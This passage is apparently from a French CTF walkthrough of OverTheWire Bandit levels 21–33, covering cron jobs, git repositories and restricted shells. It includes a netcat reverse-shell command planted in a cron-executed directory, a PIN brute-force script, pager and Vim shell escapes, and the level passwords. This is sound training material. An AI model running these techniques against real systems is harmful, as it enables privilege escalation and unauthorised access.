bandit21@bandit:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
WdDozAdTM2z9DiFEQ2mGlwngMfj4EZff
```

## Level 22

Même chose sauf que le nom du fichier est créé à partir d'une phrase contenant le nom d'utilisateur et hashé en MD5 :

```console
bandit22@bandit:~$ cat /etc/cron.d/cronjob_bandit23
@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"

cat /etc/bandit_pass/$myname > /tmp/$mytarget
bandit22@bandit:~$ cat /tmp/$(echo I am user bandit23 | md5sum | cut -d ' ' -f 1)  
QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
```

## Level 23

Le script bash appelé par cron exécute (via la commande `timeout`) les scripts placés dans `/var/spool/bandit24/foo` :

```console
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo || exit 1
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -rf ./$i
    fi
done

bandit23@bandit:~$ cd /var/spool/bandit24/foo
bandit23@bandit:/var/spool/bandit24/foo$ ls
ls: cannot open directory '.': Permission denied
bandit23@bandit:/var/spool/bandit24/foo$ ls -ald .
drwxrwx-wx 3 root bandit24 4096 Apr 27 13:58 .
bandit23@bandit:/var/spool/bandit24/foo$ which bash
/usr/bin/bash
bandit23@bandit:/var/spool/bandit24/foo$ echo "ncat -e /usr/bin/bash 127.0.0.1 9999" > script.sh;chmod +x script.sh;ncat -l -p 9999 -v
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 127.0.0.1.
Ncat: Connection from 127.0.0.1:42530.
id
uid=11024(bandit24) gid=11024(bandit24) groups=11024(bandit24)
cat /etc/bandit_pass/bandit24   
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
```

J'ai fait exécuter un reverse shell sur le port 9999.

## Level 24

> A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.  
> You do not need to create new connections each time

Cette fois, on va devoir faire un peu de programmation. Voyons déjà le message en cas de mauvais PIN :

```console
bandit24@bandit:~$ ncat localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 1234
Wrong! Please enter the correct pincode. Try again.
```

J'ai écrit le code suivant :

```python
from socket import socket

sock = socket()
sock.connect(("127.0.0.1", 30002))
sock.recv(1024)
for i in range(10000):
    sock.send(f"VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar {i:04}\n".encode())
    response = sock.recv(1024)
    if b"Wrong" not in response:
        print(f"Got following response with PIN {i:04}")
        print(response.decode())
        break

sock.close()
```

L'exécution prenant du temps j'ai refait une version qui énumère les pins en sens inverse et l'ai lancé dans une seconde session SSH. Ça m'a fait gagner du temps :

```console
bandit24@bandit:/tmp$ python3 dv25_rev.py
Got following response with PIN 9708
Correct!
The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d

Exiting.
```

## Level 25

Ce level est celui qui m'a posé le plus de difficultés. A la connexion SSH on se fait jeter sans explications.

J'ai utilisé un précédent compte pour regarder le shell de l'utilisateur `bandit26` dans `/etc/passwd` :

```console
bandit20@bandit:~$ grep bandit26 /etc/passwd
bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
bandit20@bandit:~$ file /usr/bin/showtext
/usr/bin/showtext: POSIX shell script, ASCII text executable
bandit20@bandit:~$ cat /usr/bin/showtext
#!/bin/sh

export TERM=linux

exec more ~/text.txt
exit 0
```

Donc le shell lance le pager `more`. Le programme doit quitter aussitôt si le fichier est affiché dans sa totalité. Il faut donc réduire la taille du terminal (redimensionner la fenêtre) et cette fois, on peut voir que `more` est exécuté (avec le pourcentage de scroll sur le fichier qui est indiqué).

La technique habituelle pour sortir d'un pager est de taper `!sh` sauf que là nada, rien, 0, null, nil, void...

Dans la page de manuelle de `more` on voit qu'on peut charger le fichier dans `Vim` et utilisant la touche `v`. Une fois que `Vim` a pris le relais, on peut ouvrir un autre fichier :

```
:e /etc/bandit_pass/bandit26
```

On obtient alors le mot de passe `c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1`.

En théorie on aurait aussi pu depuis `Vim` utiliser `:!sh` sauf que ça ne fonctionnait pas. Il fallait remplacer le shell puis l'exécuter :

```
:set shell=/usr/bin/bash
:shell
```

## Level 26

On a là encore un binaire setuid. Pas de difficultés.

```console
bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS
```

## Level 27

On entre dans la série des exercices en rapport avec Git.

> There is a git repository at `ssh://bandit27-git@localhost/home/bandit27-git/repo`. The password for the user `bandit27-git` is the same as for the user `bandit27`.
> 
> Clone the repository and find the password for the next level.

Il faut juste cloner le répo. Le mot de passe est dans le fichier présent :

```console
bandit27@bandit:/tmp$ git clone ssh://bandit27-git@localhost/home/bandit27-git/repo 
bandit27@bandit:/tmp$ ls repo
README
bandit27@bandit:/tmp$ cat repo/README 
The password to the next level is: AVanL161y9rsbcJIsFHuw35rjaOM19nR
```

## Level 28

Cette fois il faut cloner le répo puis fouiller la rectification qui a eu lieu en analysant les commits :

```console
bandit28@bandit:/tmp/truc$ git clone ssh://bandit28-git@localhost:2220/home/bandit28-git/repo
Cloning into 'repo'...
The authenticity of host '[localhost]:2220 ([127.0.0.1]:2220)' can't be established.
ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Could not create directory '/home/bandit28/.ssh' (Permission denied).
Failed to add the host to the list of known hosts (/home/bandit28/.ssh/known_hosts).
                         _                     _ _ _   
                        | |__   __ _ _ __   __| (_) |_ 
                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_ 
                        |_.__/ \__,_|_| |_|\__,_|_|\__|
                                                       

                      This is an OverTheWire game server. 
            More information on http://www.overthewire.org/wargames

bandit28-git@localhost's password: 
remote: Enumerating objects: 9, done.
remote: Counting objects: 100% (9/9), done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 9 (delta 2), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (9/9), done.
Resolving deltas: 100% (2/2), done.
bandit28@bandit:/tmp/truc$ cd repo/
bandit28@bandit:/tmp/truc/repo$ git log
commit 899ba88df296331cc01f30d022c006775d467f28 (HEAD -> master, origin/master, origin/HEAD)
Author: Morla Porla <morla@overthewire.org>
Date:   Sun Apr 23 18:04:39 2023 +0000

    fix info leak

commit abcff758fa6343a0d002a1c0add1ad8c71b88534
Author: Morla Porla <morla@overthewire.org>
Date:   Sun Apr 23 18:04:39 2023 +0000

    add missing data

commit c0a8c3cf093fba65f4ee0e1fe2a530b799508c78
Author: Ben Dover <noone@overthewire.org>
Date:   Sun Apr 23 18:04:39 2023 +0000

    initial commit of README.md
bandit28@bandit:/tmp/truc/repo$ git show 899ba88df296331cc01f30d022c006775d467f28
commit 899ba88df296331cc01f30d022c006775d467f28 (HEAD -> master, origin/master, origin/HEAD)
Author: Morla Porla <morla@overthewire.org>
Date:   Sun Apr 23 18:04:39 2023 +0000

    fix info leak

diff --git a/README.md b/README.md
index b302105..5c6457b 100644
--- a/README.md
+++ b/README.md
@@ -4,5 +4,5 @@ Some notes for level29 of bandit.
 ## credentials
 
 - username: bandit29
-- password: tQKvmcwNYcFS6vmPHIUSI3ShmsrQZK8S
+- password: xxxxxxxxxx
```

## Level 29

Cette fois çi le répo dispose de plusieurs branches. Il fallait switcher sur la branche `dev` :

```console
bandit29@bandit:/tmp/lolol$ git clone ssh://bandit29-git@localhost:2220/home/bandit29-git/repo
Cloning into 'repo'...
bandit29-git@localhost's password: 
remote: Enumerating objects: 16, done.
remote: Counting objects: 100% (16/16), done.
remote: Compressing objects: 100% (11/11), done.
remote: Total 16 (delta 2), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (16/16), done.
Resolving deltas: 100% (2/2), done.
bandit29@bandit:/tmp/lolol$ cd repo/
bandit29@bandit:/tmp/lolol/repo$ ls
README.md
bandit29@bandit:/tmp/lolol/repo$ cat README.md 
# Bandit Notes
Some notes for bandit30 of bandit.

## credentials

- username: bandit30
- password: <no passwords in production!>
bandit29@bandit:/tmp/lolol/repo$ git branch --all
* master
  remotes/origin/HEAD -> origin/master
  remotes/origin/dev
  remotes/origin/master
  remotes/origin/sploits-dev
bandit29@bandit:/tmp/lolol/repo$ git checkout remotes/origin/dev
Note: switching to 'remotes/origin/dev'.

You are in 'detached HEAD' state. You can look around, make experimental
changes and commit them, and you can discard any commits you make in this
state without impacting any branches by switching back to a branch.

If you want to create a new branch to retain commits you create, you may
do so (now or later) by using -c with the switch command. Example:

  git switch -c <new-branch-name>

Or undo this operation with:

  git switch -

Turn off this advice by setting config variable advice.detachedHead to false

HEAD is now at 13e7356 add data needed for development
bandit29@bandit:/tmp/lolol/repo$ ls
code  README.md
bandit29@bandit:/tmp/lolol/repo$ cat README.md 
# Bandit Notes
Some notes for bandit30 of bandit.

## credentials

- username: bandit30
- password: xbhV3HpNGlTIdnjUrdAlPzc2L6y9EOnS
```

## Level 30

On a fait les branches et les commits... J'ai fait un `grep` sur les fichiers et j'ai malgré moi obtenu un indice :

```console
bandit30@bandit:/tmp/lol30/repo$ grep -r -e "[0-9a-zA-Z]\{32\}" .
./.git/logs/HEAD:0000000000000000000000000000000000000000 59530d30d299ff2e3e9719c096ebf46a65cc1424 Ben Dover <noone@overthewire.org> 1682664853 +0000   clone: from ssh://localhost:2220/home/bandit30-git/repo
./.git/logs/refs/heads/master:0000000000000000000000000000000000000000 59530d30d299ff2e3e9719c096ebf46a65cc1424 Ben Dover <noone@overthewire.org> 1682664853 +0000      clone: from ssh://localhost:2220/home/bandit30-git/repo
./.git/logs/refs/remotes/origin/HEAD:0000000000000000000000000000000000000000 59530d30d299ff2e3e9719c096ebf46a65cc1424 Ben Dover <noone@overthewire.org> 1682664853 +0000       clone: from ssh://localhost:2220/home/bandit30-git/repo
./.git/ORIG_HEAD:59530d30d299ff2e3e9719c096ebf46a65cc1424
./.git/refs/heads/master:59530d30d299ff2e3e9719c096ebf46a65cc1424
./.git/FETCH_HEAD:59530d30d299ff2e3e9719c096ebf46a65cc1424              branch 'master' of ssh://localhost:2220/home/bandit30-git/repo
./.git/packed-refs:59530d30d299ff2e3e9719c096ebf46a65cc1424 refs/remotes/origin/master
./.git/packed-refs:831aac2e2341f009e40e46392a4f5dd318483019 refs/tags/secret
bandit30@bandit:/tmp/lol30/repo$ git tag
secret
 bandit30@bandit:/tmp/lol30/repo$ git show --name-only secret
OoffzGDlzhAlerFJ2cAiz1D41JW1Mhmt
```

Il y avait un tag nommé `secret` dont le commentaire contenait le mot de passe.

## Level 31

Cette fois, il faut pousser un fichier sur le répo, tache de base d'un programmeur.

```console
bandit31@bandit:/tmp/repo$ cat README.md 
This time your task is to push a file to the remote repository.

Details:
    File name: key.txt
    Content: 'May I come in?'
    Branch: master

bandit31@bandit:/tmp/repo$ echo 'May I come in?' > key.txt
bandit31@bandit:/tmp/repo$ git add -f key.txt
bandit31@bandit:/tmp/repo$ git commit -m "add key file"
[master 13ef1e6] add key file
 1 file changed, 1 insertion(+)
 create mode 100644 key.txt
bandit31@bandit:/tmp/repo$ git push
bandit31-git@localhost's password: 
Enumerating objects: 4, done.
Counting objects: 100% (4/4), done.
Delta compression using up to 2 threads
Compressing objects: 100% (2/2), done.
Writing objects: 100% (3/3), 324 bytes | 324.00 KiB/s, done.
Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
remote: ### Attempting to validate files... ####
remote: 
remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
remote: 
remote: Well done! Here is the password for the next level:
remote: rmCBvG56y58BXzv98yZGdO7ATVL5dW8y 
remote: 
remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
remote: 
To ssh://localhost:2220/home/bandit31-git/repo
 ! [remote rejected] master -> master (pre-receive hook declined)
error: failed to push some refs to 'ssh://localhost:2220/home/bandit31-git/repo'
```

## Level 32

On a un shell qui met nos commandes en majuscules :

```console
WELCOME TO THE UPPERCASE SHELL
>> ls
sh: 1: LS: not found
```

J'aurais trop aimé pouvoir utiliser la technique que j'ai découvert via le [Nebula 16]({% link _posts/2023-02-02-Solution-du-CTF-Nebula-(levels-12-a-19).md %}#level-16) malheureusement ça ne fonctionnait pas.

Avec le compte précédent, j'ai cherché un binaire dont le nom a un pattern assez unique et qui me donnerait un shell. J'ai trouvé la commande `linux32` qui fait le job :

```console
bandit31@bandit:~$ /usr/bin/linux32
-sh: 1: /etc/profile.d/colon.sh: Syntax error: Bad function name
$ id
uid=11031(bandit31) gid=11031(bandit31) groups=11031(bandit31)
$ 
bandit31@bandit:~$ ls /usr/bin/?????32
/usr/bin/linux32
bandit31@bandit:~$ ls /???/???/?????32
/usr/bin/linux32
```

Ca marche :

```console
WELCOME TO THE UPPERCASE SHELL
>> /???/???/?????32
-sh: 1: /etc/profile.d/colon.sh: Syntax error: Bad function name
$ id
uid=11033(bandit33) gid=11032(bandit32) groups=11032(bandit32)
$ ls
uppershell
$ ls -al
total 36
drwxr-xr-x  2 root     root      4096 Apr 23 18:04 .
drwxr-xr-x 70 root     root      4096 Apr 23 18:05 ..
-rw-r--r--  1 root     root       220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root     root      3771 Jan  6  2022 .bashrc
-rw-r--r--  1 root     root       807 Jan  6  2022 .profile
-rwsr-x---  1 bandit33 bandit32 15128 Apr 23 18:04 uppershell
$ cat /etc/bandit_pass/bandit33
odHo63fHiFqcWWJG9rLiLDtPm45KzUKy
```

La solution attendue était en réalité d'utiliser la variable d'environnement `$0` :

> `$0` is set to the name of that file. If Bash is started with the -c option (see Invoking Bash), then `$0` is set to the first argument after the string to be executed, if one is present. Otherwise, it is set to the filename used to invoke Bash, as given by argument zero.


